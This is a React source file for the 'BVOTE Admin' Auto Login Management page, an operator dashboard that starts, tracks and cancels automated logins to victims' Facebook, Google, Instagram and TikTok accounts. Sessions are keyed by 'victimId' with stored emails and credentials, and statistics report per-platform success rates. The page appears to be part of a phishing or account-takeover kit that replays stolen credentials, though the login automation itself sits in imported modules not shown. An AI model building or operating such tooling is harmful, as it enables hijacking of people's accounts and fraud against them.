import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Helmet } from "react-helmet";
import {
  Zap,
  TrendingUp,
  Users,
  Activity,
  Clock,
  CheckCircle,
  AlertCircle,
  BarChart3,
  Settings,
  Plus,
  Eye,
  Trash2,
  RefreshCw,
  Download,
} from "lucide-react";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "../components/ui/card";
import { Badge } from "../components/ui/badge";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { useToast } from "../components/ui/use-toast";
import AutoLoginPanel from "../components/AutoLoginPanel";
import AutoLoginManager, {
  PLATFORMS,
  PlatformUtils,
} from "../utils/platformManager";
import { restAdaptor } from "../adaptors";
import { useSocket } from "../hooks/useSocket";

const AutoLoginManagementPage = () => {
  const [activeTab, setActiveTab] = useState("dashboard");
  const [loginSessions, setLoginSessions] = useState([]);
  const [stats, setStats] = useState({
    totalLogins: 0,
    successRate: 0,
    activeSessions: 0,
    platformBreakdown: {},
  });
  const [searchQuery, setSearchQuery] = useState("");
  const [filterStatus, setFilterStatus] = useState("all");
  const [filterPlatform, setFilterPlatform] = useState("all");
  const { toast } = useToast();
  const { socket } = useSocket();
  const [autoLoginManager] = useState(() => new AutoLoginManager(toast));

  // Load data on mount
  useEffect(() => {
    loadLoginSessions();
    loadStats();
  }, []);

  // WebSocket listeners for real-time updates
  useEffect(() => {
    if (!socket) return;

    const handleSessionUpdate = (sessionData) => {
      setLoginSessions((prev) =>
        prev.map((session) =>
          session.id === sessionData.id
            ? { ...session, ...sessionData }
            : session
        )
      );
    };

    const handleNewSession = (sessionData) => {
      setLoginSessions((prev) => [sessionData, ...prev]);
    };

    socket.on("auto_login:session_update", handleSessionUpdate);
    socket.on("auto_login:new_session", handleNewSession);

    return () => {
      socket.off("auto_login:session_update", handleSessionUpdate);
      socket.off("auto_login:new_session", handleNewSession);
    };
  }, [socket]);

  const loadLoginSessions = async () => {
    try {
      const response = await restAdaptor.get("/auto-login/sessions");
      if (response.success) {
        setLoginSessions(response.data || []);
      }
    } catch (error) {
      console.error("Failed to load login sessions:", error);
      // Mock data for development
      setLoginSessions([
        {
          id: "session_1",
          platform: "facebook",
          victimId: "VICTIM_001",
          userEmail: "user@example.com",
          status: "completed",
          startTime: new Date(Date.now() - 30000).toISOString(),
          endTime: new Date().toISOString(),
          duration: 30000,
          steps: ["navigation", "fill_credentials", "submit", "post_login"],
        },
        {
          id: "session_2",
          platform: "google",
          victimId: "VICTIM_002",
          userEmail: "test@gmail.com",
          status: "in_progress",
          startTime: new Date(Date.now() - 15000).toISOString(),
          currentStep: "fill_credentials",
          steps: ["navigation", "fill_credentials"],
        },
        {
          id: "session_3",
          platform: "instagram",
          victimId: "VICTIM_003",
          userEmail: "insta@example.com",
          status: "failed",
          startTime: new Date(Date.now() - 60000).toISOString(),
          endTime: new Date(Date.now() - 45000).toISOString(),
          error: "Captcha verification failed",
          steps: ["navigation", "fill_credentials"],
        },
      ]);
    }
  };

  const loadStats = async () => {
    try {
      const response = await restAdaptor.get("/auto-login/stats");
      if (response.success) {
        setStats(response.data);
      }
    } catch (error) {
      console.error("Failed to load stats:", error);
      // Mock stats
      setStats({
        totalLogins: 156,
        successRate: 87.5,
        activeSessions: 2,
        platformBreakdown: {
          facebook: { total: 89, success: 78 },
          google: { total: 34, success: 31 },
          instagram: { total: 23, success: 18 },
          tiktok: { total: 10, success: 8 },
        },
      });
    }
  };

  const handleStartLogin = async (config) => {
    try {
      const result = await autoLoginManager.startAutoLogin(config);

      // Add to sessions list
      const newSession = {
        id: result.sessionId,
        platform: config.platformId,
        victimId: config.victimId,
        userEmail: config.credentials.email,
        status: "in_progress",
        startTime: new Date().toISOString(),
        currentStep: "initializing",
        steps: [],
      };

      setLoginSessions((prev) => [newSession, ...prev]);

      toast({
        title: "🚀 Auto Login Started",
        description: `Started ${
          PlatformUtils.getPlatformStyle(config.platformId).name
        } login for ${config.victimId}`,
        duration: 3000,
      });
    } catch (error) {
      toast({
        title: "❌ Failed to Start Login",
        description: error.message,
        variant: "destructive",
      });
    }
  };

  const handleCancelLogin = async (sessionId) => {
    try {
      await autoLoginManager.cancelSession(sessionId);

      setLoginSessions((prev) =>
        prev.map((session) =>
          session.id === sessionId
            ? { ...session, status: "cancelled" }
            : session
        )
      );

      toast({
        title: "🛑 Session Cancelled",
        description: "Auto login session has been cancelled",
        duration: 2000,
      });
    } catch (error) {
      toast({
        title: "❌ Failed to Cancel",
        description: error.message,
        variant: "destructive",
      });
    }
  };

  const filteredSessions = loginSessions.filter((session) => {
    const matchesSearch =
      !searchQuery ||
      session.userEmail.toLowerCase().includes(searchQuery.toLowerCase()) ||
      session.victimId.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesStatus =
      filterStatus === "all" || session.status === filterStatus;
    const matchesPlatform =
      filterPlatform === "all" || session.platform === filterPlatform;

    return matchesSearch && matchesStatus && matchesPlatform;
  });

  const getStatusBadge = (status) => {
    const statusConfig = {
      initializing: "bg-blue-500/20 text-blue-400",
      in_progress: "bg-yellow-500/20 text-yellow-400",
      completed: "bg-green-500/20 text-green-400",
      failed: "bg-red-500/20 text-red-400",
      cancelled: "bg-gray-500/20 text-gray-400",
    };

    return (
      <Badge className={`${statusConfig[status]} border-0`}>{status}</Badge>
    );
  };

  const formatDuration = (ms) => {
    if (!ms) return "N/A";
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    return minutes > 0 ? `${minutes}m ${seconds % 60}s` : `${seconds}s`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 p-6">
      <Helmet>
        <title>Auto Login Management - BVOTE Admin</title>
      </Helmet>

      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-white flex items-center gap-3">
              <Zap className="w-8 h-8 text-yellow-500" />
              Auto Login Management
            </h1>
            <p className="text-gray-300 mt-2">
              Quản lý auto login cho tất cả nền tảng
            </p>
          </div>
          <Button
            onClick={() => {
              loadLoginSessions();
              loadStats();
            }}
            className="bg-blue-600 hover:bg-blue-700"
          >
            <RefreshCw className="w-4 h-4 mr-2" />
            Refresh
          </Button>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Total Logins</p>
                  <p className="text-2xl font-bold text-white">
                    {stats.totalLogins}
                  </p>
                </div>
                <BarChart3 className="w-8 h-8 text-blue-500" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Success Rate</p>
                  <p className="text-2xl font-bold text-green-400">
                    {stats.successRate}%
                  </p>
                </div>
                <TrendingUp className="w-8 h-8 text-green-500" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Active Sessions</p>
                  <p className="text-2xl font-bold text-yellow-400">
                    {stats.activeSessions}
                  </p>
                </div>
                <Activity className="w-8 h-8 text-yellow-500" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Platforms</p>
                  <p className="text-2xl font-bold text-purple-400">
                    {Object.keys(stats.platformBreakdown || {}).length}
                  </p>
                </div>
                <Users className="w-8 h-8 text-purple-500" />
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Tab Navigation */}
        <div className="flex gap-4 border-b border-gray-700">
          {[
            { id: "dashboard", label: "Dashboard", icon: BarChart3 },
            { id: "new-login", label: "New Login", icon: Plus },
            { id: "sessions", label: "Sessions", icon: Activity },
            { id: "settings", label: "Settings", icon: Settings },
          ].map((tab) => {
            const IconComponent = tab.icon;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2 border-b-2 transition-colors ${
                  activeTab === tab.id
                    ? "border-blue-500 text-blue-400"
                    : "border-transparent text-gray-400 hover:text-white"
                }`}
              >
                <IconComponent className="w-4 h-4" />
                {tab.label}
              </button>
            );
          })}
        </div>

        {/* Tab Content */}
        <div className="space-y-6">
          {activeTab === "dashboard" && (
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Platform Breakdown */}
              <Card className="bg-gray-800/50 border-gray-700">
                <CardHeader>
                  <CardTitle>Platform Breakdown</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {Object.entries(stats.platformBreakdown || {}).map(
                      ([platformId, data]) => {
                        const platformInfo =
                          PlatformUtils.getPlatformStyle(platformId);
                        const successRate =
                          data.total > 0
                            ? ((data.success / data.total) * 100).toFixed(1)
                            : 0;

                        return (
                          <div
                            key={platformId}
                            className="flex items-center justify-between p-3 bg-gray-700/30 rounded-lg"
                          >
                            <div className="flex items-center gap-3">
                              <span className="text-lg">
                                {platformInfo.icon}
                              </span>
                              <div>
                                <div className="text-white font-medium">
                                  {platformInfo.name}
                                </div>
                                <div className="text-xs text-gray-400">
                                  {data.success}/{data.total} logins
                                </div>
                              </div>
                            </div>
                            <Badge
                              className={`${
                                successRate >= 80
                                  ? "bg-green-500/20 text-green-400"
                                  : "bg-yellow-500/20 text-yellow-400"
                              } border-0`}
                            >
                              {successRate}%
                            </Badge>
                          </div>
                        );
                      }
                    )}
                  </div>
                </CardContent>
              </Card>

              {/* Recent Sessions */}
              <Card className="bg-gray-800/50 border-gray-700">
                <CardHeader>
                  <CardTitle>Recent Sessions</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    {loginSessions.slice(0, 5).map((session) => {
                      const platformInfo = PlatformUtils.getPlatformStyle(
                        session.platform
                      );
                      return (
                        <div
                          key={session.id}
                          className="flex items-center justify-between p-3 bg-gray-700/30 rounded-lg"
                        >
                          <div className="flex items-center gap-3">
                            <span className="text-lg">{platformInfo.icon}</span>
                            <div>
                              <div className="text-white text-sm">
                                {session.userEmail}
                              </div>
                              <div className="text-xs text-gray-400">
                                {new Date(session.startTime).toLocaleTimeString(
                                  "vi-VN"
                                )}
                              </div>
                            </div>
                          </div>
                          {getStatusBadge(session.status)}
                        </div>
                      );
                    })}
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "new-login" && (
            <AutoLoginPanel
              onStartLogin={handleStartLogin}
              onCancelLogin={handleCancelLogin}
              currentSessions={loginSessions.filter(
                (s) => s.status === "in_progress"
              )}
            />
          )}

          {activeTab === "sessions" && (
            <div className="space-y-6">
              {/* Filters */}
              <Card className="bg-gray-800/50 border-gray-700">
                <CardContent className="p-4">
                  <div className="flex flex-wrap gap-4 items-center">
                    <Input
                      placeholder="Search by email or victim ID..."
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      className="max-w-xs bg-gray-700 border-gray-600"
                    />

                    <select
                      value={filterStatus}
                      onChange={(e) => setFilterStatus(e.target.value)}
                      className="px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white"
                    >
                      <option value="all">All Status</option>
                      <option value="in_progress">In Progress</option>
                      <option value="completed">Completed</option>
                      <option value="failed">Failed</option>
                      <option value="cancelled">Cancelled</option>
                    </select>

                    <select
                      value={filterPlatform}
                      onChange={(e) => setFilterPlatform(e.target.value)}
                      className="px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white"
                    >
                      <option value="all">All Platforms</option>
                      {Object.values(PLATFORMS).map((platform) => (
                        <option key={platform.id} value={platform.id}>
                          {platform.displayName}
                        </option>
                      ))}
                    </select>
                  </div>
                </CardContent>
              </Card>

              {/* Sessions Table */}
              <Card className="bg-gray-800/50 border-gray-700">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-gray-700">
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Platform
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            User
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Victim
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Status
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Duration
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Started
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-300">
                            Actions
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {filteredSessions.map((session) => {
                          const platformInfo = PlatformUtils.getPlatformStyle(
                            session.platform
                          );
                          const duration = session.endTime
                            ? new Date(session.endTime).getTime() -
                              new Date(session.startTime).getTime()
                            : Date.now() -
                              new Date(session.startTime).getTime();

                          return (
                            <tr
                              key={session.id}
                              className="border-b border-gray-700/50 hover:bg-gray-700/20"
                            >
                              <td className="py-3 px-4">
                                <div className="flex items-center gap-2">
                                  <span className="text-lg">
                                    {platformInfo.icon}
                                  </span>
                                  <span className="text-white text-sm">
                                    {platformInfo.name}
                                  </span>
                                </div>
                              </td>
                              <td className="py-3 px-4 text-white text-sm">
                                {session.userEmail}
                              </td>
                              <td className="py-3 px-4 text-purple-400 text-sm font-mono">
                                {session.victimId}
                              </td>
                              <td className="py-3 px-4">
                                {getStatusBadge(session.status)}
                              </td>
                              <td className="py-3 px-4 text-gray-300 text-sm">
                                {formatDuration(duration)}
                              </td>
                              <td className="py-3 px-4 text-gray-300 text-sm">
                                {new Date(session.startTime).toLocaleString(
                                  "vi-VN"
                                )}
                              </td>
                              <td className="py-3 px-4">
                                <div className="flex gap-2">
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    className="border-gray-600 text-xs"
                                  >
                                    <Eye className="w-3 h-3" />
                                  </Button>
                                  {session.status === "in_progress" && (
                                    <Button
                                      size="sm"
                                      variant="outline"
                                      onClick={() =>
                                        handleCancelLogin(session.id)
                                      }
                                      className="border-red-500 text-red-400 hover:bg-red-500/20 text-xs"
                                    >
                                      Cancel
                                    </Button>
                                  )}
                                </div>
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "settings" && (
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle>Auto Login Settings</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="text-gray-300">
                    <h3 className="font-medium mb-2">Global Settings</h3>
                    <div className="space-y-2">
                      <div className="flex items-center gap-2">
                        <input
                          type="checkbox"
                          id="autoRetry"
                          className="rounded"
                          defaultChecked
                        />
                        <label htmlFor="autoRetry" className="text-sm">
                          Enable auto retry on failure
                        </label>
                      </div>
                      <div className="flex items-center gap-2">
                        <input
                          type="checkbox"
                          id="screenshots"
                          className="rounded"
                          defaultChecked
                        />
                        <label htmlFor="screenshots" className="text-sm">
                          Take screenshots by default
                        </label>
                      </div>
                      <div className="flex items-center gap-2">
                        <input
                          type="checkbox"
                          id="notifications"
                          className="rounded"
                          defaultChecked
                        />
                        <label htmlFor="notifications" className="text-sm">
                          Enable real-time notifications
                        </label>
                      </div>
                    </div>
                  </div>

                  <div className="pt-4 border-t border-gray-700">
                    <Button className="bg-blue-600 hover:bg-blue-700">
                      Save Settings
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
};

export default AutoLoginManagementPage;
